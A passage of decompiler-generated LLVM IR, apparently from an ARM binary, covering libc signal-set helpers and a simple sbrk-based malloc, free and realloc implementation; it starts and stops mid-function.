  %v2_14c98 = add i32 %v5_14ca425, -136
  %v3_14c98 = inttoptr i32 %v2_14c98 to i32*
  store i32 0, i32* %v3_14c98, align 4
  %v0_14c9c.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_14c9c = add i32 %v0_14c9c.pre, -1
  store i32 %v1_14c9c, i32* %r0.global-to-local, align 4
  %v6_14c9c = icmp slt i32 %v1_14c9c, 0
  %v4_14ca4 = mul i32 %v1_14c9c, 4
  %v5_14ca4 = add i32 %v4_14ca4, %v10_14c58
  br i1 %v6_14c9c, label %dec_label_pc_14cac, label %dec_label_pc_14c94

dec_label_pc_14cac:                               ; preds = %dec_label_pc_14c94
  %v2_14cac = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_14cac, i32* @r5, align 4
  %v2_14cb0 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_14cb0, i32* @r0, align 4
  %v0_14cb4 = load i32, i32* @r4, align 4
  store i32 %v0_14cb4, i32* @r1, align 4
  %v0_14cb8 = call i32 @__sigaddset()
  store i32 %v0_14cb8, i32* %r0.global-to-local, align 4
  %v1_14cbc = icmp slt i32 %v0_14cb8, 0
  br i1 %v1_14cbc, label %dec_label_pc_14cfc, label %dec_label_pc_14cc4

dec_label_pc_14cc4:                               ; preds = %dec_label_pc_14cac
  %v0_14cc4 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_32b94.1138 to i32), i32* %r0.global-to-local, align 4
  %v2_14ccc = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_32b94.1138 to i32), i32 %v0_14cc4)
  %v0_14ce4 = load i32, i32* @r4, align 4
  store i32 %v0_14ce4, i32* %r0.global-to-local, align 4
  %v4_14cec = call i32 @__libc_sigaction(i32 %v0_14ce4, i32* nonnull %stack_var_-152, i32 %v2_14c64)
  store i32 %v4_14cec, i32* %r0.global-to-local, align 4
  %v1_14cf0 = icmp slt i32 %v4_14cec, 0
  br i1 %v1_14cf0, label %dec_label_pc_14cfc, label %bb23

bb23:                                             ; preds = %dec_label_pc_14cc4
  %v5_14cf4 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_14cf4, i32* @r2, align 4
  br label %dec_label_pc_14d00

dec_label_pc_14cfc:                               ; preds = %dec_label_pc_14cc4, %dec_label_pc_14cac
  store i32 -1, i32* @r2, align 4
  br label %dec_label_pc_14d00

dec_label_pc_14d00:                               ; preds = %bb23, %dec_label_pc_14c80, %dec_label_pc_14cfc
  %v0_14d00 = phi i32 [ %v5_14cf4, %bb23 ], [ %v0_14d00.pre, %dec_label_pc_14c80 ], [ -1, %dec_label_pc_14cfc ]
  store i32 %v0_14d00, i32* %r0.global-to-local, align 4
  %v2_14d08 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14d08, i32* @r4, align 4
  store i32 %v6_14c58, i32* @r5, align 4
  ret i32 %v0_14d00

; uselistorder directives
  uselistorder i32 %v0_14d00, { 1, 0 }
  uselistorder i32 %v1_14c9c, { 0, 2, 1 }
  uselistorder i32 %v0_14c68.pre, { 1, 0, 2 }
  uselistorder i32 %v10_14c58, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_14d00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14c94, { 1, 0 }
  uselistorder label %dec_label_pc_14c80, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_14d10 = add i32 %arg2, -1
  %v3_14d14 = udiv i32 %v1_14d10, 32
  %v4_14d18 = mul nuw nsw i32 %v3_14d14, 4
  %v5_14d18 = add i32 %v4_14d18, %arg1
  %v6_14d18 = inttoptr i32 %v5_14d18 to i32*
  %v7_14d18 = load i32, i32* %v6_14d18, align 4
  %v1_14d1c = urem i32 %v1_14d10, 32
  %v7_14d24 = shl i32 1, %v1_14d1c
  %v8_14d24 = and i32 %v7_14d18, %v7_14d24
  %v10_14d24 = icmp ne i32 %v8_14d24, 0
  %. = zext i1 %v10_14d24 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_14d10, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_14d34 = load i32, i32* @r1, align 4
  %v1_14d34 = add i32 %v0_14d34, -1
  %v3_14d38 = udiv i32 %v1_14d34, 32
  %v0_14d3c = load i32, i32* @r0, align 4
  %v4_14d3c = mul nuw nsw i32 %v3_14d38, 4
  %v5_14d3c = add i32 %v0_14d3c, %v4_14d3c
  %v6_14d3c = inttoptr i32 %v5_14d3c to i32*
  %v7_14d3c = load i32, i32* %v6_14d3c, align 4
  %v1_14d40 = urem i32 %v1_14d34, 32
  %v7_14d48 = shl i32 1, %v1_14d40
  %v8_14d48 = or i32 %v7_14d3c, %v7_14d48
  store i32 %v8_14d48, i32* %v6_14d3c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14d34, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_14d58 = add i32 %arg2, -1
  %v3_14d5c = udiv i32 %v1_14d58, 32
  %v4_14d60 = mul nuw nsw i32 %v3_14d5c, 4
  %v5_14d60 = add i32 %v4_14d60, %arg1
  %v6_14d60 = inttoptr i32 %v5_14d60 to i32*
  %v7_14d60 = load i32, i32* %v6_14d60, align 4
  %v1_14d64 = urem i32 %v1_14d58, 32
  %tmp = shl i32 -1, %v1_14d64
  %v8_14d6c = add i32 %tmp, -1
  %v9_14d6c = and i32 %v7_14d60, %v8_14d6c
  store i32 %v9_14d6c, i32* %v6_14d60, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14d58, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14d7c = load i32, i32* @r4, align 4
  %v6_14d7c = load i32, i32* @r5, align 4
  %v9_14d7c = load i32, i32* @r6, align 4
  %v0_14d80 = load i32, i32* %r0.global-to-local, align 4
  %v2_14d80 = icmp eq i32 %v0_14d80, 0
  %v2_14d84 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_14d80, label %bb, label %dec_label_pc_14d90

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14d98

dec_label_pc_14d90:                               ; preds = %entry
  %tmp = icmp ugt i32 %v0_14d80, -8
  br i1 %tmp, label %dec_label_pc_14e9c, label %dec_label_pc_14d98

dec_label_pc_14d98:                               ; preds = %bb, %dec_label_pc_14d90
  %v0_14d98 = phi i32 [ %v0_14d80, %dec_label_pc_14d90 ], [ 1, %bb ]
  %v1_14d98 = add i32 %v0_14d98, 4
  store i32 %v1_14d98, i32* %stack_var_-20, align 4
  store i32 %v2_14d84, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_32b24.1140 to i32), i32* %r0.global-to-local, align 4
  %v1_14db0 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_2c6d4.1144 to i32), i32* %r0.global-to-local, align 4
  %v3_14dbc = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_2c6d4.1144 to i32*), i32 %v2_14d84)
  store i32 %v3_14dbc, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32b24.1140 to i32), i32* %r0.global-to-local, align 4
  store i32 85460, i32* @lr, align 4
  %v1_14dd0 = call i32 @__pthread_return_0()
  store i32 %v1_14dd0, i32* %r0.global-to-local, align 4
  %v2_14dd4 = icmp eq i32 %v3_14dbc, 0
  br i1 %v2_14dd4, label %dec_label_pc_14ddc, label %dec_label_pc_14e8c

dec_label_pc_14ddc:                               ; preds = %dec_label_pc_14d98
  %v2_14de0 = load i32, i32* @global_var_32b4c.985, align 4
  store i32 %v2_14de0, i32* @r4, align 4
  %v2_14de4 = load i32, i32* %stack_var_-20, align 4
  %v3_14de8 = icmp ult i32 %v2_14de4, %v2_14de0
  br i1 %v3_14de8, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_14ddc
  %v3_14dec = add i32 %v2_14de0, -1
  %v2_14df0 = add i32 %v3_14dec, %v2_14de4
  %v2_14df4 = sub i32 0, %v2_14de0
  %v3_14df8 = and i32 %v2_14df0, %v2_14df4
  store i32 %v3_14df8, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14ddc, %bb14
  store i32 ptrtoint (i32* @global_var_32c14.1148 to i32), i32* %r0.global-to-local, align 4
  %v1_14e04 = call i32 @__pthread_return_0()
  %v0_14e08 = load i32, i32* @r4, align 4
  store i32 %v0_14e08, i32* %r0.global-to-local, align 4
  %v1_14e0c = call i32 @__GI_sbrk(i32 %v0_14e08)
  store i32 %v1_14e0c, i32* %r0.global-to-local, align 4
  %v7_14e10 = icmp eq i32 %v1_14e0c, -1
  br i1 %v7_14e10, label %bb15, label %dec_label_pc_14e1c

bb15:                                             ; preds = %.thread3
  store i32 %v1_14e0c, i32* @r5, align 4
  br label %dec_label_pc_14e30

dec_label_pc_14e1c:                               ; preds = %.thread3
  %v1_14e1c = add i32 %v1_14e0c, 3
  %v1_14e20 = and i32 %v1_14e1c, -4
  store i32 %v1_14e20, i32* @r5, align 4
  %v9_14e24 = icmp eq i32 %v1_14e20, %v1_14e0c
  br i1 %v9_14e24, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_14e1c
  %v3_14e28 = sub i32 %v1_14e20, %v1_14e0c
  store i32 %v3_14e28, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14e1c, %bb16
  %v1_14e2c = xor i1 %v9_14e24, true
  call void @__pseudo_cond_branch(i1 %v1_14e2c, i32 ptrtoint (i32* @global_var_164fc.1149 to i32))
  br label %dec_label_pc_14e30

dec_label_pc_14e30:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_32c14.1148 to i32), i32* %r0.global-to-local, align 4
  store i32 85568, i32* @lr, align 4
  %v1_14e3c = call i32 @__pthread_return_0()
  store i32 %v1_14e3c, i32* %r0.global-to-local, align 4
  %v0_14e40 = load i32, i32* @r5, align 4
  %v7_14e40 = icmp eq i32 %v0_14e40, -1
  br i1 %v7_14e40, label %dec_label_pc_14e9c, label %dec_label_pc_14e48

dec_label_pc_14e48:                               ; preds = %dec_label_pc_14e30
  store i32 ptrtoint (i32* @global_var_32b24.1140 to i32), i32* %r0.global-to-local, align 4
  %v1_14e54 = call i32 @__pthread_return_0()
  %v0_14e58 = load i32, i32* @r4, align 4
  %v0_14e5c = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_2c6d4.1144 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_14e5c, 16777216
  %v2_14e64 = sdiv i32 %sext, 16777216
  %v5_14e64 = call i32 @__heap_free(i32* bitcast (i32** @global_var_2c6d4.1144 to i32*), i32 %v2_14e64, i32 %v0_14e58)
  store i32 ptrtoint (i32** @global_var_2c6d4.1144 to i32), i32* %r0.global-to-local, align 4
  %v3_14e70 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_2c6d4.1144 to i32*), i32 %v2_14d84)
  store i32 %v3_14e70, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32b24.1140 to i32), i32* %r0.global-to-local, align 4
  store i32 85636, i32* @lr, align 4
  %v1_14e80 = call i32 @__pthread_return_0()
  store i32 %v1_14e80, i32* %r0.global-to-local, align 4
  %v2_14e84 = icmp eq i32 %v3_14e70, 0
  br i1 %v2_14e84, label %dec_label_pc_14e9c, label %dec_label_pc_14e8c

dec_label_pc_14e8c:                               ; preds = %dec_label_pc_14d98, %dec_label_pc_14e48
  %v1_14e90 = phi i32 [ %v3_14dbc, %dec_label_pc_14d98 ], [ %v3_14e70, %dec_label_pc_14e48 ]
  %v2_14e8c = load i32, i32* %stack_var_-20, align 4
  %v2_14e90 = inttoptr i32 %v1_14e90 to i32*
  store i32 %v2_14e8c, i32* %v2_14e90, align 4
  %v3_14e90 = load i32, i32* %r4.global-to-local, align 4
  %v4_14e90 = add i32 %v3_14e90, 4
  store i32 %v4_14e90, i32* %r4.global-to-local, align 4
  %v2_14e94 = icmp eq i32 %v4_14e90, 0
  br i1 %v2_14e94, label %dec_label_pc_14e9c, label %dec_label_pc_14eac

dec_label_pc_14e9c:                               ; preds = %dec_label_pc_14e8c, %dec_label_pc_14e48, %dec_label_pc_14e30, %dec_label_pc_14d90
  %v0_14e9c = call i32 @__errno_location()
  store i32 %v0_14e9c, i32* %r0.global-to-local, align 4
  %v2_14ea4 = inttoptr i32 %v0_14e9c to i32*
  store i32 12, i32* %v2_14ea4, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14eac

dec_label_pc_14eac:                               ; preds = %dec_label_pc_14e8c, %dec_label_pc_14e9c
  %v0_14eac = phi i32 [ %v4_14e90, %dec_label_pc_14e8c ], [ 0, %dec_label_pc_14e9c ]
  store i32 %v0_14eac, i32* %r0.global-to-local, align 4
  store i32 %v3_14d7c, i32* @r4, align 4
  store i32 %v6_14d7c, i32* @r5, align 4
  store i32 %v9_14d7c, i32* @r6, align 4
  ret i32 %v0_14eac

; uselistorder directives
  uselistorder i32 %v0_14eac, { 1, 0 }
  uselistorder i32 %v3_14e70, { 1, 0, 2 }
  uselistorder i32 %v1_14e20, { 1, 0, 2 }
  uselistorder i32 %v1_14e0c, { 3, 0, 2, 4, 1, 5 }
  uselistorder i32 %v3_14dbc, { 1, 0, 2 }
  uselistorder i32 %v0_14d80, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 4, 6, 8, 9, 10, 3, 12, 11, 16, 14, 13, 2, 15, 17, 18, 19, 0, 1 }
  uselistorder label %dec_label_pc_14eac, { 1, 0 }
  uselistorder label %dec_label_pc_14e8c, { 1, 0 }
  uselistorder label %dec_label_pc_14e30, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14d98, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_14ed0 = load i32, i32* @r0, align 4
  %v2_14ed0 = icmp eq i32 %v0_14ed0, 0
  %v3_14ed4 = load i32, i32* @r4, align 4
  store i32 %v3_14ed4, i32* %stack_var_-24, align 4
  %v6_14ed4 = load i32, i32* @r5, align 4
  %v9_14ed4 = load i32, i32* @r6, align 4
  %v15_14ed4 = load i32, i32* @r8, align 4
  br i1 %v2_14ed0, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_14edc = add i32 %v0_14ed0, -4
  %v2_14edc = inttoptr i32 %v1_14edc to i32*
  %v3_14edc = load i32, i32* %v2_14edc, align 4
  store i32 %v3_14edc, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_2c6d4.1144 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_14edc, i32* @r4, align 4
  %v1_14ef4 = call i32 @__pthread_return_0()
  %v0_14ef8 = load i32, i32* @r4, align 4
  %v0_14efc = load i32, i32* @r5, align 4
  %v4_14f04 = call i32 @__heap_free(i32* bitcast (i32** @global_var_2c6d4.1144 to i32*), i32 %v0_14ef8, i32 %v0_14efc)
  %v1_14f0c = inttoptr i32 %v4_14f04 to i32*
  %v2_14f0c = load i32, i32* %v1_14f0c, align 4
  store i32 %v2_14f0c, i32* %r6.global-to-local, align 4
  %v2_14f10 = load i32, i32* @global_var_32b4c.985, align 4
  %v4_14f14 = mul i32 %v2_14f10, 8
  %v6_14f14 = icmp ult i32 %v2_14f0c, %v4_14f14
  store i32 %v4_14f04, i32* @r4, align 4
  br i1 %v6_14f14, label %dec_label_pc_14f54, label %dec_label_pc_14f20

dec_label_pc_14f20:                               ; preds = %bb11
  %v1_14f28 = call i32 @__pthread_return_0()
  %v1_14f30 = call i32 @__GI_sbrk(i32 0)
  %v0_14f34 = load i32, i32* @r4, align 4
  %v1_14f34 = add i32 %v0_14f34, 12
  store i32 %v1_14f34, i32* @r5, align 4
  %v9_14f38 = icmp eq i32 %v1_14f34, %v1_14f30
  br i1 %v9_14f38, label %dec_label_pc_14f5c, label %dec_label_pc_14f40

dec_label_pc_14f40:                               ; preds = %dec_label_pc_14f20
  %v1_14f4c = call i32 @__pthread_return_0()
  br label %dec_label_pc_14f54

dec_label_pc_14f54:                               ; preds = %bb11, %dec_label_pc_14f40, %bb14
  %v2_14f54 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14f54, i32* @r4, align 4
  store i32 %v6_14ed4, i32* @r5, align 4
  store i32 %v9_14ed4, i32* %r6.global-to-local, align 4
  store i32 %v15_14ed4, i32* %r8.global-to-local, align 4
  %v0_14f58 = call i32 @__pthread_return_0()
  %v0_14f5c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14f5c

dec_label_pc_14f5c:                               ; preds = %dec_label_pc_14f20, %dec_label_pc_14f54
  %v1_14f64 = phi i32 [ %v0_14f34, %dec_label_pc_14f20 ], [ %v0_14f5c.pre, %dec_label_pc_14f54 ]
  %v1_14f5c = add i32 %v1_14f64, 4
  %v2_14f5c = inttoptr i32 %v1_14f5c to i32*
  %v3_14f5c = load i32, i32* %v2_14f5c, align 4
  %v2_14f60 = icmp eq i32 %v3_14f5c, 0
  br i1 %v2_14f60, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_14f5c
  %v2_14f64 = add i32 %v1_14f64, 8
  %v3_14f64 = inttoptr i32 %v2_14f64 to i32*
  %v4_14f64 = load i32, i32* %v3_14f64, align 4
  %v3_14f68 = add i32 %v3_14f5c, 8
  %v4_14f68 = inttoptr i32 %v3_14f68 to i32*
  store i32 %v4_14f64, i32* %v4_14f68, align 4
  %v0_14f6c.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14f5c, %bb12
  %v0_14f6c = phi i32 [ %v1_14f64, %dec_label_pc_14f5c ], [ %v0_14f6c.pre, %bb12 ]
  %v1_14f6c = add i32 %v0_14f6c, 8
  %v2_14f6c = inttoptr i32 %v1_14f6c to i32*
  %v3_14f6c = load i32, i32* %v2_14f6c, align 4
  %v1_14f70 = add i32 %v0_14f6c, 4
  %v2_14f70 = inttoptr i32 %v1_14f70 to i32*
  %v3_14f70 = load i32, i32* %v2_14f70, align 4
  %v2_14f74 = icmp eq i32 %v3_14f6c, 0
  br i1 %v2_14f74, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_14f78 = add i32 %v3_14f6c, 4
  %v4_14f78 = inttoptr i32 %v3_14f78 to i32*
  store i32 %v3_14f70, i32* %v4_14f78, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_14f7c = load i32, i32* %r8.global-to-local, align 4
  %v3_14f7c = inttoptr i32 %v2_14f7c to i32*
  store i32 %v3_14f70, i32* %v3_14f7c, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_14f8c = call i32 @__pthread_return_0()
  %v0_14f90 = load i32, i32* %r6.global-to-local, align 4
  %v1_14f90 = load i32, i32* @r4, align 4
  %v0_14f98 = load i32, i32* @r5, align 4
  %v2_14f90 = sub i32 12, %v0_14f90
  %v1_14f94 = add i32 %v2_14f90, %v1_14f90
  %v2_14f98 = sub i32 %v1_14f94, %v0_14f98
  %v1_14f9c = call i32 @__GI_sbrk(i32 %v2_14f98)
  br label %dec_label_pc_14f54

; uselistorder directives
  uselistorder i32 %v0_14f6c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_14f5c, { 1, 0 }
  uselistorder label %dec_label_pc_14f54, { 2, 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14fc0 = load i32, i32* @r4, align 4
  store i32 %v3_14fc0, i32* %stack_var_-24, align 4
  %v6_14fc0 = load i32, i32* @r5, align 4
  %v9_14fc0 = load i32, i32* @r6, align 4
  %v12_14fc0 = load i32, i32* @r7, align 4
  %v15_14fc0 = load i32, i32* @r8, align 4
  %v18_14fc0 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_14fc4 = icmp eq i32 %arg2, 0
  %v0_14fc8 = load i32, i32* @r0, align 4
  store i32 %v0_14fc8, i32* @r7, align 4
  br i1 %v2_14fc4, label %dec_label_pc_14fd0, label %dec_label_pc_14fd8

dec_label_pc_14fd0:                               ; preds = %entry
  %v0_14fd0 = call i32 @free()
  %v0_14fe0.pre = load i32, i32* @r4, align 4
  %v2_14fe4.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_14fe0

dec_label_pc_14fd8:                               ; preds = %entry
  %v2_14fd8 = icmp eq i32 %v0_14fc8, 0
  br i1 %v2_14fd8, label %dec_label_pc_14fe0, label %dec_label_pc_14fec

dec_label_pc_14fe0:                               ; preds = %dec_label_pc_14fd8, %dec_label_pc_14fd0
  %v2_14fe4 = phi i32 [ %v3_14fc0, %dec_label_pc_14fd8 ], [ %v2_14fe4.pre, %dec_label_pc_14fd0 ]
  %v0_14fe0 = phi i32 [ %arg2, %dec_label_pc_14fd8 ], [ %v0_14fe0.pre, %dec_label_pc_14fd0 ]
  store i32 %v2_14fe4, i32* @r4, align 4
  store i32 %v6_14fc0, i32* @r5, align 4
  store i32 %v9_14fc0, i32* @r6, align 4
  store i32 %v12_14fc0, i32* @r7, align 4
  store i32 %v18_14fc0, i32* @lr, align 4
  %v1_14fe8 = call i32 @malloc(i32 %v0_14fe0)
  %v0_14fec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14fec

dec_label_pc_14fec:                               ; preds = %dec_label_pc_14fd8, %dec_label_pc_14fe0
  %v0_15004 = phi i32 [ %v0_14fc8, %dec_label_pc_14fd8 ], [ %v1_14fe8, %dec_label_pc_14fe0 ]
  %v0_14fec = phi i32 [ %arg2, %dec_label_pc_14fd8 ], [ %v0_14fec.pre, %dec_label_pc_14fe0 ]
  %v1_14fec = add i32 %v0_14fec, 7
  %v1_14ff0 = and i32 %v1_14fec, -4
  store i32 %v1_14ff0, i32* @r5, align 4
  %v2_14ff4 = icmp ugt i32 %v1_14ff0, 10
  %v1_14ff8 = add i32 %v0_15004, -4
  %v2_14ff8 = inttoptr i32 %v1_14ff8 to i32*
  %v3_14ff8 = load i32, i32* %v2_14ff8, align 4
  store i32 %v3_14ff8, i32* @r6, align 4
  br i1 %v2_14ff4, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_14fec
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_14fec, %bb
  %v0_15080 = phi i32 [ %v1_14ff0, %dec_label_pc_14fec ], [ 12, %bb ]
  store i32 %v1_14ff8, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_15080, %v3_14ff8
  br i1 %tmp, label %dec_label_pc_1500c, label %dec_label_pc_15080

dec_label_pc_1500c:                               ; preds = %bb14
  %v2_15000 = sub i32 %v0_15080, %v3_14ff8
  %v1_1501c = call i32 @__pthread_return_0()
  %v0_15024 = load i32, i32* @r8, align 4
  %v1_15024 = load i32, i32* @r6, align 4
  %v2_15024 = add i32 %v1_15024, %v0_15024
  %v4_1502c = call i32 @__heap_alloc_at(i32* bitcast (i32** @global_var_2c6d4.1144 to i32*), i32 %v2_15024, i32 %v2_15000)
  store i32 %v4_1502c, i32* @r4, align 4
  store i32 86084, i32* @lr, align 4
  %v1_15040 = call i32 @__pthread_return_0()
  %v0_15044 = load i32, i32* @r4, align 4
  %v2_15044 = icmp eq i32 %v0_15044, 0
  br i1 %v2_15044, label %dec_label_pc_15054, label %.thread

.thread:                                          ; preds = %dec_label_pc_1500c
  %v1_15048 = load i32, i32* @r6, align 4
  %v3_15048 = add i32 %v1_15048, %v0_15044
  %v2_1504c = load i32, i32* @r7, align 4
  %v3_1504c = add i32 %v2_1504c, -4
  %v4_1504c = inttoptr i32 %v3_1504c to i32*
  store i32 %v3_15048, i32* %v4_1504c, align 4
  br label %dec_label_pc_150c0

dec_label_pc_15054:                               ; preds = %dec_label_pc_1500c
  %v0_15054 = load i32, i32* @r5, align 4
  %v1_15054 = add i32 %v0_15054, -4
  %v1_15058 = call i32 @malloc(i32 %v1_15054)
  store i32 %v1_15058, i32* @r0, align 4
  store i32 %v1_15058, i32* @r4, align 4
  %v2_1505c = icmp eq i32 %v1_15058, 0
  br i1 %v2_1505c, label %dec_label_pc_15078, label %dec_label_pc_15064

dec_label_pc_15064:                               ; preds = %dec_label_pc_15054
  %v0_15064 = load i32, i32* @r6, align 4
  %v1_15064 = add i32 %v0_15064, -4
  store i32 %v1_15064, i32* @r2, align 4
  %v0_15068 = load i32, i32* @r7, align 4
  store i32 %v0_15068, i32* @r1, align 4
  %v0_1506c = call i32 @memcpy()
  %v0_15070 = load i32, i32* @r7, align 4
  store i32 %v0_15070, i32* @r0, align 4
  %v0_15074 = call i32 @free()
  %v0_15078.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15078

dec_label_pc_15078:                               ; preds = %dec_label_pc_15054, %dec_label_pc_15064
  %v0_15078 = phi i32 [ 0, %dec_label_pc_15054 ], [ %v0_15078.pre, %dec_label_pc_15064 ]
  store i32 %v0_15078, i32* @r7, align 4
  br label %dec_label_pc_150c0

dec_label_pc_15080:                               ; preds = %bb14
  %v1_15080 = add i32 %v0_15080, 28
  %tmp15 = icmp ugt i32 %v1_15080, %v3_14ff8
  br i1 %tmp15, label %dec_label_pc_150c0, label %dec_label_pc_1508c

dec_label_pc_1508c:                               ; preds = %dec_label_pc_15080
  %v1_15098 = call i32 @__pthread_return_0()
  %v0_1509c = load i32, i32* @r8, align 4
  %v1_1509c = load i32, i32* @r5, align 4
  %v2_1509c = add i32 %v1_1509c, %v0_1509c
  %v1_150a0 = load i32, i32* @r6, align 4
  %v2_150a0 = sub i32 %v1_150a0, %v1_1509c
  %v4_150a8 = call i32 @__heap_free(i32* bitcast (i32** @global_var_2c6d4.1144 to i32*), i32 %v2_1509c, i32 %v2_150a0)
  store i32 86204, i32* @lr, align 4
  %v1_150b8 = call i32 @__pthread_return_0()
  %v0_150bc = load i32, i32* @r5, align 4
  %v1_150bc = load i32, i32* @r7, align 4
  %v2_150bc = add i32 %v1_150bc, -4
  %v3_150bc = inttoptr i32 %v2_150bc to i32*
  store i32 %v0_150bc, i32* %v3_150bc, align 4
  br label %dec_label_pc_150c0

dec_label_pc_150c0:                               ; preds = %.thread, %dec_label_pc_15080, %dec_label_pc_15078, %dec_label_pc_1508c
  %v0_150c0 = load i32, i32* @r7, align 4
  store i32 %v9_14fc0, i32* @r6, align 4
  store i32 %v15_14fc0, i32* @r8, align 4
  ret i32 %v0_150c0

; uselistorder directives
  uselistorder i32 %v1_1509c, { 1, 0 }
  uselistorder i32 %v0_15080, { 1, 2, 0 }
  uselistorder i32 %v3_14ff8, { 0, 2, 1, 3 }
  uselistorder i32** @global_var_2c6d4.1144, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_2c6d4.1144 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_150c0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_15078, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_14fec, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_150d8 = inttoptr i32 %arg2 to i32*
  %v2_150d8 = load i32, i32* %v1_150d8, align 4
  %v3_150dc = load i32, i32* @r4, align 4
  store i32 %v3_150dc, i32* %stack_var_-8, align 4
  %v1_150e0 = add i32 %v2_150d8, 3
  %v1_150e4 = and i32 %v1_150e0, -4
  store i32 %v1_150e4, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_150ec = icmp ugt i32 %v1_150e4, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_150f4 = load i32, i32* %arg1, align 4
  store i32 %v2_150f4, i32* %r0.global-to-local, align 4
  br i1 %v2_150ec, label %dec_label_pc_15160.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15160.preheader

dec_label_pc_15160.preheader:                     ; preds = %entry, %bb
  %v1_15114 = phi i32 [ %v1_150e4, %entry ], [ 12, %bb ]
  %v2_151609 = icmp eq i32 %v2_150f4, 0
